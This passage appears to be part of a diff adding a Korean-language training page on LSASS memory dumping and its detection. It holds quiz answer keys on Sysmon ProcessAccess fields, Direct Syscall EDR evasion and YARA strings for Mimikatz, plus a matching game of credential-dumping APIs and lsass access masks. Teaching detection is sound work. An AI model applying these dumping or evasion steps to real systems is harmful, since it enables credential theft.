+                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
+                                    <input type="radio" name="fq3" value="1" class="mr-3"> SourceImage + TargetImage + GrantedAccess
+                                </label>
+                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
+                                    <input type="radio" name="fq3" value="2" class="mr-3"> ProcessId + ParentProcessId
+                                </label>
+                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
+                                    <input type="radio" name="fq3" value="3" class="mr-3"> DestinationPort + SourcePort
+                                </label>
+                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
+                                    <input type="radio" name="fq3" value="4" class="mr-3"> RuleName + EventType
+                                </label>
+                            </div>
+                            <div class="quiz-explanation hidden mt-2 p-3 rounded bg-blue-50 dark:bg-blue-900/20 text-xs text-blue-700 dark:text-blue-300">💡 Event ID 10(ProcessAccess)에서 SourceImage(접근한 프로세스), TargetImage(lsass.exe), GrantedAccess(요청한 권한)를 조합하여 비정상적 접근을 탐지합니다.</div>
+                        </div>
+                        <div class="quiz-q" data-correct="1">
+                            <h3 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q4. Direct Syscall 기법이 일반적인 API 모니터링을 우회할 수 있는 이유는?</h3>
+                            <div class="space-y-2 text-sm">
+                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
+                                    <input type="radio" name="fq4" value="1" class="mr-3"> ntdll.dll을 거치지 않고 커널을 직접 호출하기 때문
+                                </label>
+                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
+                                    <input type="radio" name="fq4" value="2" class="mr-3"> 네트워크를 통해 원격으로 실행하기 때문
+                                </label>
+                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
+                                    <input type="radio" name="fq4" value="3" class="mr-3"> 관리자 권한이 필요 없기 때문
+                                </label>
+                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
+                                    <input type="radio" name="fq4" value="4" class="mr-3"> 메모리에 접근하지 않기 때문
+                                </label>
+                            </div>
+                            <div class="quiz-explanation hidden mt-2 p-3 rounded bg-blue-50 dark:bg-blue-900/20 text-xs text-blue-700 dark:text-blue-300">💡 일반적으로 API 모니터링 도구(EDR)는 ntdll.dll의 함수를 후킹합니다. Direct Syscall은 ntdll.dll을 우회하여 시스템 콜 번호로 커널을 직접 호출하므로 이러한 후킹을 회피합니다.</div>
+                        </div>
+                        <div class="quiz-q" data-correct="3">
+                            <h3 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q5. YARA 규칙에서 Mimikatz를 탐지할 때 파일명 변경 우회를 방지하는 방법은?</h3>
+                            <div class="space-y-2 text-sm">
+                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
+                                    <input type="radio" name="fq5" value="1" class="mr-3"> 파일명만으로 탐지
+                                </label>
+                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
+                                    <input type="radio" name="fq5" value="2" class="mr-3"> 파일 크기로 탐지
+                                </label>
+                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
+                                    <input type="radio" name="fq5" value="3" class="mr-3"> 바이너리 내부의 고유 문자열 패턴으로 탐지
+                                </label>
+                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
+                                    <input type="radio" name="fq5" value="4" class="mr-3"> 실행 시간으로 탐지
+                                </label>
+                            </div>
+                            <div class="quiz-explanation hidden mt-2 p-3 rounded bg-blue-50 dark:bg-blue-900/20 text-xs text-blue-700 dark:text-blue-300">💡 YARA 규칙은 파일 내부의 고유 문자열(예: &#39;sekurlsa::logonpasswords&#39;, &#39;gentilkiwi&#39;)이나 바이너리 패턴을 매칭합니다. 파일명을 변경해도 내부 코드는 동일하므로 여전히 탐지됩니다.</div>
+                        </div>
+                        <button onclick="gradeFinalQuiz()" class="bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 px-8 rounded-lg font-mono transition shadow-sm cursor-pointer">정답 확인</button>
+                    </div>
+                    <div id="quiz-result" class="hidden mt-6 p-4 rounded-lg text-sm font-mono shadow-sm"></div>
+                </div>
+            </section>
+
+            <!-- Final CTA -->
+            <div class="pt-12 pb-8 text-center border-t border-blue-400/30 mt-16">
+                <div class="inline-block bg-blue-500/20 text-blue-700 dark:text-blue-400 px-4 py-1 rounded-full font-bold text-sm mb-4 border border-blue-400">🎉 학습 완료</div>
+                <h2 class="text-3xl font-extrabold text-[#1e293b] dark:text-white mb-4">LSASS Memory Dump Techniques &amp; Detection 중급 과정을 완료했습니다!</h2>
+                <p class="text-cgray dark:text-slate-400 mb-8 max-w-xl mx-auto">LSASS 메모리 덤프 기법과 탐지 중급 학습을 마쳤습니다. 고급 과정에서 더 심화된 기법을 배워보세요.</p>
+                <button onclick="window.location.href='/'" class="inline-flex items-center gap-3 bg-gradient-to-r from-blue-600 to-blue-800 dark:from-blue-400 dark:to-blue-600 text-white dark:text-slate-900 px-8 py-4 rounded-xl font-bold shadow-lg transform transition hover:-translate-y-1 hover:shadow-2xl cursor-pointer">
+                    <span class="text-2xl">🚀</span><span>매트릭스 대시보드로 돌아가기</span>
+                </button>
+            </div>
+
+        </div>
+    </main>
+    </div>
+
+    <script>
+        /* ─── Navigation ─── */
+        function go(id){var el=document.getElementById(id);if(el)document.getElementById('main-scroll').scrollTo({top:el.offsetTop-40,behavior:'smooth'});}
+
+        /* ─── Theme Toggle ─── */
+        function toggleTheme(){var h=document.documentElement,i=document.getElementById('theme-icon');if(h.classList.contains('dark')){h.classList.remove('dark');h.classList.add('light');i.textContent='🌙';}else{h.classList.remove('light');h.classList.add('dark');i.textContent='☀️';}}
+
+        /* ─── Intersection Observer ─── */
+        var observerOptions={root:document.getElementById('main-scroll'),rootMargin:'0px 0px -40% 0px',threshold:0.1};
+        var observer=new IntersectionObserver(function(entries){entries.forEach(function(entry){if(entry.isIntersecting){entry.target.classList.remove('opacity-0','translate-y-10');entry.target.classList.add('opacity-100','translate-y-0');var id=entry.target.getAttribute('id');document.querySelectorAll('.nav-item').forEach(function(nav){nav.classList.remove('active');if(nav.getAttribute('data-target')===id)nav.classList.add('active');});}});},observerOptions);
+        document.querySelectorAll('.section-observe').forEach(function(s){observer.observe(s);});
+
+        /* ─── Utility ─── */
+        function shuffleArray(arr){var a=arr.slice();for(var i=a.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1));var t=a[i];a[i]=a[j];a[j]=t;}return a;}
+
+        /* ═══════ Matching Game 0 ═══════ */
+        var matchItems_0=[{&#34;desc&#34;:&#34;대상 프로세스의 핸들을 획득하는 API&#34;,&#34;answer&#34;:&#34;OpenProcess&#34;},{&#34;desc&#34;:&#34;프로세스 메모리를 파일로 저장하는 API&#34;,&#34;answer&#34;:&#34;MiniDumpWriteDump&#34;},{&#34;desc&#34;:&#34;프로세스의 가상 메모리를 직접 읽는 NT API&#34;,&#34;answer&#34;:&#34;NtReadVirtualMemory&#34;},{&#34;desc&#34;:&#34;DLL 내 함수 주소를 동적으로 가져오는 API&#34;,&#34;answer&#34;:&#34;GetProcAddress&#34;},{&#34;desc&#34;:&#34;lsass.exe의 PID를 찾기 위해 프로세스를 열거하는 API&#34;,&#34;answer&#34;:&#34;EnumProcesses&#34;}];
+        var matchTypes_0=[&#34;OpenProcess&#34;,&#34;MiniDumpWriteDump&#34;,&#34;NtReadVirtualMemory&#34;,&#34;GetProcAddress&#34;,&#34;EnumProcesses&#34;];
+        var matchScore_0=0;var matchAnswered_0=[];
+        function initMatchGame_0(){
+            matchScore_0=0;matchAnswered_0=[];
+            document.getElementById('match-score-0').textContent='0';
+            var container=document.getElementById('match-game-0');container.innerHTML='';
+            matchItems_0.forEach(function(item,idx){
+                var row=document.createElement('div');row.className='bg-white/50 dark:bg-slate-800/50 rounded-xl p-4 border border-slate-200 dark:border-slate-700';row.id='match-row-0-'+idx;
+                var descP=document.createElement('p');descP.className='text-sm text-cgray dark:text-slate-300 mb-3';descP.textContent=(idx+1)+'. '+item.desc;row.appendChild(descP);
+                var btnContainer=document.createElement('div');btnContainer.className='flex flex-wrap gap-2';
+                shuffleArray(matchTypes_0).forEach(function(type){var btn=document.createElement('button');btn.className='match-btn text-xs px-3 py-1.5 rounded-full border border-slate-300 dark:border-slate-600 bg-white dark:bg-slate-800 text-cgray dark:text-slate-300 font-mono cursor-pointer';btn.textContent=type;btn.onclick=function(){handleMatch_0(idx,type,btn);};btnContainer.appendChild(btn);});
+                row.appendChild(btnContainer);
+                var fb=document.createElement('div');fb.id='match-fb-0-'+idx;fb.className='mt-2 text-xs font-mono hidden';row.appendChild(fb);container.appendChild(row);
+            });
+        }
+        function handleMatch_0(idx,selected,btnEl){
+            if(matchAnswered_0.indexOf(idx)!==-1)return;matchAnswered_0.push(idx);
+            var fb=document.getElementById('match-fb-0-'+idx);fb.classList.remove('hidden');
+            var row=document.getElementById('match-row-0-'+idx);var btns=row.querySelectorAll('.match-btn');
+            if(selected===matchItems_0[idx].answer){matchScore_0++;document.getElementById('match-score-0').textContent=matchScore_0;fb.className='mt-2 text-xs font-mono text-green-600 dark:text-green-400';fb.textContent='✅ 정답! '+matchItems_0[idx].answer;btnEl.classList.add('correct');}
+            else{fb.className='mt-2 text-xs font-mono text-red-600 dark:text-red-400';fb.textContent='❌ 오답! 정답은 '+matchItems_0[idx].answer;btnEl.classList.add('wrong');btns.forEach(function(b){if(b.textContent===matchItems_0[idx].answer)b.classList.add('correct');});}
+            btns.forEach(function(b){b.onclick=null;b.style.cursor='default';});
+        }
+        /* ═══════ Step Click 1 ═══════ */
+        var stepCurrent_1=0;
+        function handleStepClick_1(idx){
+            if(idx!==stepCurrent_1)return;
+            var container=document.getElementById('step-click-1');
+            var steps=container.querySelectorAll('.step-btn');
+            steps[idx].classList.add('active');
+            steps[idx].querySelector('.step-detail').classList.remove('hidden');
+            if(idx>0)steps[idx-1].classList.remove('active');
+            if(idx>0)steps[idx-1].classList.add('completed');
+            stepCurrent_1=idx+1;
+            if(stepCurrent_1=== 6){
+                steps[idx].classList.remove('active');steps[idx].classList.add('completed');
+                document.getElementById('step-result-1').classList.remove('hidden');
+            }
+        }
+        /* ═══════ Code Fill 2 ═══════ */
+        var codeFillAnswers_2=[{&#34;id&#34;:&#34;blank1&#34;,&#34;answer&#34;:&#34;process_access&#34;,&#34;alternatives&#34;:[&#34;ProcessAccess&#34;]},{&#34;id&#34;:&#34;blank2&#34;,&#34;answer&#34;:&#34;lsass.exe&#34;,&#34;alternatives&#34;:[&#34;LSASS.exe&#34;,&#34;LSASS.EXE&#34;]},{&#34;id&#34;:&#34;blank3&#34;,&#34;answer&#34;:&#34;0x1010&#34;,&#34;alternatives&#34;:[&#34;0x1F0FFF&#34;,&#34;0x1410&#34;]}];
+        function checkCodeFill_2(){
+            var inputs=document.querySelectorAll('#code-fill-2 .code-blank');
+            var correct=0;var total=inputs.length;
+            inputs.forEach(function(inp){
+                var blankId=inp.getAttribute('data-blank-id');
+                var ans=codeFillAnswers_2.find(function(a){return a.id===blankId;});
+                if(!ans)return;
+                var userVal=inp.value.trim().toLowerCase();
+                var correctVal=ans.answer.toLowerCase();
+                var alts=ans.alternatives.map(function(a){return a.toLowerCase();});
+                if(userVal===correctVal||alts.indexOf(userVal)!==-1){correct++;inp.classList.add('correct');inp.classList.remove('wrong');}
+                else{inp.classList.add('wrong');inp.classList.remove('correct');}
+            });
+            var r=document.getElementById('code-fill-result-2');r.classList.remove('hidden');
+            if(correct===total){r.className='mt-4 p-4 rounded text-sm font-mono shadow-sm bg-blue-100 border border-blue-400 text-blue-700 dark:bg-blue-900/30 dark:text-blue-400';r.textContent='✅ '+correct+'/'+total+' 정답! 모든 빈칸을 올바르게 채웠습니다.';}
+            else{r.className='mt-4 p-4 rounded text-sm font-mono shadow-sm bg-red-100 border border-red-400 text-red-700 dark:bg-red-900/50 dark:text-red-400';r.textContent='❌ '+correct+'/'+total+' 정답. 틀린 부분을 확인하고 다시 시도하세요.';}
+        }
+        function resetCodeFill_2(){
+            var inputs=document.querySelectorAll('#code-fill-2 .code-blank');
+            inputs.forEach(function(inp){inp.value='';inp.classList.remove('correct','wrong');});
+            document.getElementById('code-fill-result-2').classList.add('hidden');
+        }
+
+        /* ═══════ Final Quiz ═══════ */
+        function gradeFinalQuiz(){
+            var questions=document.querySelectorAll('#final-quiz .quiz-q');
+            var correct=0;var total=questions.length;var details=[];
+            questions.forEach(function(q,i){
+                var ans=q.getAttribute('data-correct');
+                var sel=q.querySelector('input[name="fq'+(i+1)+'"]:checked');
+                var labels=q.querySelectorAll('label');
+                var explanation=q.querySelector('.quiz-explanation');
+                if(explanation)explanation.classList.remove('hidden');
+                if(sel&&sel.value===ans){correct++;labels.forEach(function(l){if(l.querySelector('input').value===ans)l.classList.add('bg-green-50','dark:bg-green-900/20','border-green-400');});details.push('<div class="text-green-600 dark:text-green-400">✅ Q'+(i+1)+' 정답</div>');}
+                else{labels.forEach(function(l){if(sel&&l.querySelector('input').value===sel.value)l.classList.add('bg-red-50','dark:bg-red-900/20','border-red-400');if(l.querySelector('input').value===ans)l.classList.add('bg-green-50','dark:bg-green-900/20','border-green-400');});details.push('<div class="text-red-500">❌ Q'+(i+1)+' 오답'+(sel?'':' (미선택)')+'</div>');}
+            });
+            var pct=Math.round((correct/total)*100);
+            var grade=pct>=80?'우수':pct>=60?'양호':'재학습 권장';
+            var res=document.getElementById('quiz-result');res.classList.remove('hidden');
+            res.className='mt-6 p-4 rounded-lg text-sm font-mono shadow-sm '+(pct>=80?'bg-blue-100 border border-blue-400 text-blue-700 dark:bg-blue-900/30 dark:text-blue-400':pct>=60?'bg-[#F4D06F]/30 border border-[#F4D06F] text-[#b45309] dark:text-[#F4D06F]':'bg-red-100 border border-red-400 text-red-700 dark:bg-red-900/50 dark:text-red-400');
+            res.innerHTML='<div class="flex items-center gap-3 mb-3"><div class="text-3xl font-black '+(pct>=80?'text-green-500':pct>=60?'text-yellow-500':'text-red-500')+'">'+pct+'%</div><div><div class="font-bold text-sm">'+grade+' ('+correct+'/'+total+')</div><div class="text-xs opacity-70">중급 과정 종합 평가</div></div></div><div class="space-y-1">'+details.join('')+'</div>';
+        }
+
+        /* ─── Init ─── */
+        window.onload=function(){
+            initMatchGame_0();
+            setTimeout(function(){go('ch1');},100);
+        };
+    </script>
+    <script src="/edu/lab-link.js"></script>
+    <script src="/edu/progress-tracker.js"></script>
+    <script src="/edu/breadcrumb.js"></script>
+</body>
+</html>
